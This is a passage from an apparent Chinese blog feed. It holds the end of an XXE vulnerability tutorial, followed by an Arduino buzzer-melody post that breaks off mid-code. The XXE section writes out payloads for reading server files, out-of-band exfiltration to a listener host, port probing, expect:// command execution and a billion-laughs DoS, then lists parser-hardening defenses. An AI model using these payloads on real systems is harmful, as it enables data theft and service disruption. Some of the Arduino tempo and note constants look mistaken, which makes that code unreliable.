class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///D:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.77.1/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xxe.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ENTITY all &quot;%start;%xxe;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>回显：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411221956406.png" alt="image-20210411221956406"></p><p>此外，针对读取文件中含特殊字符的情况并且该网站是php语言编写的，那我们可以使用php的一些伪协议进行读取。</p><p>用到的伪协议：</p><blockquote><p>php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。</p></blockquote><p>实际利用：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=D:/test.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411222122278.png" alt="image-20210411222122278"></p><p>base64解码后得到test.txt中的内容</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411222200953.png" alt="image-20210411222200953"></p><ol start="2"><li>在实际情况中，大多数情况下服务器上的XML并不是输出用的，所以就少了输出这一环节，这样的话，即使漏洞存在，我们的payload的也被解析了，但是由于没有输出，我们也不知道解析得到的内容是什么，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带数据。</li></ol><p>途径：通过外部DTD的方式可以将内部参数实体的内容与外部DTD声明的实体的内容拼接起来。<br>利用payload来从目标主机读取到文件内容后，将文件内容作为url的一部分来请求我们本地监听的端口。</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.232.128/a.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>a.dtd文件内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;tmp&#x2F;test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.232.128&#x2F;?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>查看服务器日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail /var/<span class="built_in">log</span>/nginx/access.log</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411235840135.png" alt="image-20210411235840135"></p><p>同样，base64解码得test.txt的内容</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411235716386.png" alt="image-20210411235716386"></p><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>因为我们的XML在引用外部DTD和外部实体的时候支持http协议，我们可以利用这个特点进行端口探测。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//禁用/启用加载外部实体的功能</span></span><br><span class="line">    libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">    <span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$creds</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.77.1:80&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，如果是请求开放的端口，请求时间较短。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210413223616203.png" alt="image-20210413223616203"></p><p>而如果请求的是未开放的端口，则请求时间明显加长!</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210413223716363.png" alt="image-20210413223716363"></p><p>进一步可利用burpsuite的爆破模块(Intruder)对所在网段进行端口探测。</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>当目标机器安装并加载了PHP的expect扩展,可以执行系统命令.(由于这个扩展不是默认安装的,所以很少碰到!)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [ <span class="meta">&lt;!ELEMENT  <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h2><p>在实验的过程中发现,单独一个数据包并不明显,可以结合burpsuite的爆破模块使用!(实际测试切记不要尝试)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">     <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol</span> <span class="meta-string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol2</span> <span class="meta-string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol3</span> <span class="meta-string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol4</span> <span class="meta-string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol5</span> <span class="meta-string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol6</span> <span class="meta-string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol7</span> <span class="meta-string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol8</span> <span class="meta-string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol9</span> <span class="meta-string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h1><ol><li><p>禁用外部实体应用 </p><p>PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>JAVA</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>,<span class="keyword">false</span>)</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>Python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure></li><li><p>黑名单过滤</p></li></ol><p>建立黑名单，如&lt;、DOCTYPE、ENTITY、SYSTEM、PUBLIC等字符，过滤掉用户输入的敏感词。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://xz.aliyun.com/t/3357#toc-11">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p><p>[2] <a href="https://mature-sec.com/post/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#xxe%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">XXE漏洞学习</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arduino致听体验</title>
      <link href="posts/64177.html"/>
      <url>posts/64177.html</url>
      
        <content type="html"><![CDATA[<div class="note red icon simple"><i class="note-icon fas fa-bullhorn"></i><p>上次Arduino小车无果而终之后，决定整点好玩的。没错，它来了，它来了，蜂鸣器带着它<del>好听</del>的音乐走来了。</p></div><h1 id="所用材料"><a href="#所用材料" class="headerlink" title="所用材料"></a>所用材料</h1><ol><li>Adruino uno一块</li><li>面包板一个</li><li>无源蜂鸣器一个</li><li>杜邦线若干</li></ol><h1 id="硬件接线"><a href="#硬件接线" class="headerlink" title="硬件接线"></a>硬件接线</h1><table><thead><tr><th align="center">arduino</th><th align="center">蜂鸣器</th></tr></thead><tbody><tr><td align="center">5V</td><td align="center">VCC</td></tr><tr><td align="center">GND</td><td align="center">GND</td></tr><tr><td align="center">8</td><td align="center">I/O</td></tr></tbody></table><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210403160903354.png" alt="image-20210403160903354"></p><h1 id="发出声音"><a href="#发出声音" class="headerlink" title="发出声音"></a>发出声音</h1><p>前面我们已经把数字IO连接到了蜂鸣器的正极，让蜂鸣器响起来只需要在数字IO上放入方波即可。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">digitalWrite</span>(buzzerPin,<span class="literal">HIGH</span>); <span class="comment">//高电平</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">digitalWrite</span>(buzzerPin,<span class="literal">LOW</span>);  <span class="comment">//低电平</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>其中的100指的是发声后延时100ms</p><h1 id="唱出旋律"><a href="#唱出旋律" class="headerlink" title="唱出旋律"></a>唱出旋律</h1><p>如果只是发出响声的话，那也太鸡肋了吧？如果要发出精确的不同频率的乐音怎么办？难道还要算？（下面是一张乐音频率图）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwMTA3MjE1ODQ2NzU5" alt="音符表"></p><p>算是不可能啦，这里直接把大佬们“翻译”好的代码搬了过来，感谢分享！下面三首“歌曲”可以试着听一下~</p><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">葫芦娃</button></li><li class="tab"><button type="button" data-href="#-2">千本樱</button></li><li class="tab"><button type="button" data-href="#-3">爱拼才会赢</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><audio controls="" preload="" __idm_id__="269361153">  <source    src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/%E8%91%AB%E8%8A%A6%E5%A8%83.mp3"    type="audio/mp3"  />  Your browser does not support the audio tag.</audio><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D0 -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D1 294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D2 330</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D3 350</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D4 393</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D5 441</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D6 495</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D7 556</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL1 147</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL2 165</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL3 175</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL4 196</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL5 221</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL6 248</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL7 278</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH1 589</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH2 661</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH3 700</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH4 786</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH5 882</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH6 990</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH7 112</span></span><br><span class="line"><span class="comment">//以上部分是定义是把每个音符和频率值对应起来，其实不用打这么多，但是都打上了，后面可以随意编写D调的各种歌，我这里用NOTE_D+数字表示音符，NOTE_DH+数字表示上面有点的那种音符，NOTE_DL+数字表示下面有点的那种音符。这样后面写起来比较好识别。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WHOLE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HALF 0.5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUARTER 0.25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EIGHTH 0.25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIXTEENTH 0.625</span></span><br><span class="line"><span class="comment">//这部分是用英文对应了拍子，这样后面也比较好看</span></span><br><span class="line"><span class="keyword">int</span> tune[] =</span><br><span class="line">&#123;</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D5,NOTE_D6,NOTE_D0,</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D5,NOTE_DH1,NOTE_D6,NOTE_D0,NOTE_D6,</span><br><span class="line">  NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D6,NOTE_D0,NOTE_D6,</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D5,NOTE_DH1,NOTE_D6,NOTE_D0,</span><br><span class="line">  </span><br><span class="line">  NOTE_D1,NOTE_D1,NOTE_D3,</span><br><span class="line">  NOTE_D1,NOTE_D1,NOTE_D3,NOTE_D0,</span><br><span class="line">  NOTE_D6,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D6,</span><br><span class="line">  NOTE_D5,NOTE_D1,NOTE_D3,NOTE_D0,</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D6,</span><br><span class="line">  NOTE_D5,NOTE_D1,NOTE_D2,NOTE_D0,</span><br><span class="line">  NOTE_D7,NOTE_D7,NOTE_D5,NOTE_D3,</span><br><span class="line">  NOTE_D5,</span><br><span class="line">  NOTE_DH1,NOTE_D0,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_D0,NOTE_D5,NOTE_D1,NOTE_D3,NOTE_D0,</span><br><span class="line">  NOTE_DH1,NOTE_D0,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_D0,NOTE_D5,NOTE_D1,NOTE_D2,NOTE_D0,</span><br><span class="line">  NOTE_D3,NOTE_D3,NOTE_D1,NOTE_DL6,</span><br><span class="line">  NOTE_D1,</span><br><span class="line">  NOTE_D3,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_D3,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_DH1,NOTE_D0,NOTE_D7,NOTE_D5,</span><br><span class="line">  NOTE_D6,</span><br><span class="line">&#125;;<span class="comment">//这部分就是整首曲子的音符部分，用了一个序列定义为tune，整数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> duration[]=</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  </span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span></span><br><span class="line">&#125;;<span class="comment">//这部分是整首曲子的接拍部分，也定义个序列duration，浮点（数组的个数和前面音符的个数是一样的，一一对应么）</span></span><br><span class="line"><span class="keyword">int</span> length;<span class="comment">//这里定义一个变量，后面用来表示共有多少个音符</span></span><br><span class="line"><span class="keyword">int</span> tonePin=<span class="number">8</span>;<span class="comment">//蜂鸣器的pin</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">pinMode</span>(tonePin,<span class="literal">OUTPUT</span>);<span class="comment">//设置蜂鸣器的pin为输出模式</span></span><br><span class="line">  length = <span class="keyword">sizeof</span>(tune)/<span class="keyword">sizeof</span>(tune[<span class="number">0</span>]);<span class="comment">//这里用了一个sizeof函数，可以查出tone序列里有多少个音符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>;x&lt;length;x++)<span class="comment">//循环音符的次数</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">tone</span>(tonePin,tune[x]);<span class="comment">//此函数依次播放tune序列里的数组，即每个音符</span></span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">400</span>*duration[x]);<span 